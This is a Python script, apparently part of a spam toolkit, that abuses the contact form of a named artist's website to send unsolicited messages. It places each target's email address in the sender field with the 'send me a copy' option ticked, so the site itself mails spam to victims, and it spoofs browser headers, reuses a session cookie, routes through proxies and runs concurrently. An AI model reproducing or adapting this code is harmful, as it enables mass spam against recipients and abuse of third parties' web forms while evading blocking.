from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': 'j31fhrijmeqmmpmmvod2mr8gf7',
    # '__utma': '58986166.1072915826.1677144067.1677144067.1677144067.1',
    # '__utmc': '58986166',
    # '__utmz': '58986166.1677144067.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    # '__utmt': '1',
    # '__utmb': '58986166.3.10.1677144067',
}

headers = {
    'authority': 'www.jimcarsonstudio.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'PHPSESSID=j31fhrijmeqmmpmmvod2mr8gf7; __utma=58986166.1072915826.1677144067.1677144067.1677144067.1; __utmc=58986166; __utmz=58986166.1677144067.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; __utmb=58986166.3.10.1677144067',
    'origin': 'https://www.jimcarsonstudio.com',
    'referer': 'https://www.jimcarsonstudio.com/contact-the-artist/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'action': 'send',
            'SendersName': 'SendersName',
            'SendersEmailAddress': target,
            'Subject': 'Subject',
            'SendMe': 'on',
            'Message': self.get_text(),
            'SendEmail': 'Send',
        }

        response = requests.post('https://www.jimcarsonstudio.com/contact-the-artist/', cookies=cookies,
                                 headers=headers, data=data, proxies=self.get_proxies())
        return response


def main():
    s = 'Your message has been sent'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
